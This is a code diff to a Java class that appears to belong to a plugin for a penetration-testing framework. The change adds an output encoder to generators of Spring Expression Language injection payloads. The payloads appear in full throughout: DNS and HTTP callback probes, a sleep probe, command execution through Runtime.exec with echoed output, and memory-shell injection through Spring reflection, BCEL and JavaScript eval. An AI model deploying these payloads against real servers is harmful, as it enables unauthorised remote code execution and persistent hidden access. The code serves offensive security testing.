@@ -6,6 +6,17 @@ import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
 import me.gv7.woodpecker.plugin.utils.Utils;
 
 public class SpELExpr implements IExpr {
+    private String _encoder = "none";
+
+    @Override
+    public void setEncoder(String encoder) {
+        _encoder = encoder;
+    }
+
+    private String out(String text) {
+        return Utils.encoder(text, _encoder);
+    }
+
     @Override
     public String getName() {
         return "SpEL";
@@ -13,35 +24,37 @@ public class SpELExpr implements IExpr {
 
     @Override
     public String[] genDnslog(String domain) {
-        return new String[]{"#{T(java.net.InetAddress).getByName('" + domain.replace("'", "''") + "')}"};
+        return new String[]{
+                out("#{T(java.net.InetAddress).getByName('" + domain.replace("'", "''") + "')}")
+        };
     }
 
     @Override
     public String[] genHttplog(String url) {
         return new String[]{
-                "#{T(org.springframework.web.client.RestTemplate).newInstance().headForHeaders('" + url.replace("'", "''") + "')}",
-                "#{new java.net.URL('" + url.replace("'", "''") + "').getContent()}"
+                out("#{T(org.springframework.web.client.RestTemplate).newInstance().headForHeaders('" + url.replace("'", "''") + "')}"),
+                out("#{new java.net.URL('" + url.replace("'", "''") + "').getContent()}")
         };
     }
 
     @Override
     public String[] genSleep(int sec) {
         return new String[]{
-                "#{T(java.lang.Thread).sleep(" + (sec * 1000) + ")}"
+                out("#{T(java.lang.Thread).sleep(" + (sec * 1000) + ")}")
         };
     }
 
     @Override
     public String[] genExec(String command) {
         return new String[]{
-                "#{T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "')}"
+                out("#{T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "')}")
         };
     }
 
     @Override
     public String[] genExecWithEcho(String command) {
         return new String[]{
-                "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "').getInputStream()).useDelimiter('/').next()}"
+                out("#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "').getInputStream()).useDelimiter('/').next()}")
         };
     }
 
@@ -49,10 +62,10 @@ public class SpELExpr implements IExpr {
     public String[] genMemShell(byte[] memShellClass) {
         try {
             return new String[]{
-                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + genSpringMemShell1(memShellClass) + System.lineSeparator() + " <==",
-                    "[+] BCEL方案：==>" + System.lineSeparator() + genSpringMemShell2(memShellClass) + System.lineSeparator() + " <==",
-                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}" + System.lineSeparator() + " <==",
-                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}" + System.lineSeparator() + " <=="
+                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + out(genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
+                    "[+] BCEL方案：==>" + System.lineSeparator() + out(genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
+                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
+                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}") + System.lineSeparator() + " <=="
             };
         } catch (Exception ex) {
             return new String[]{
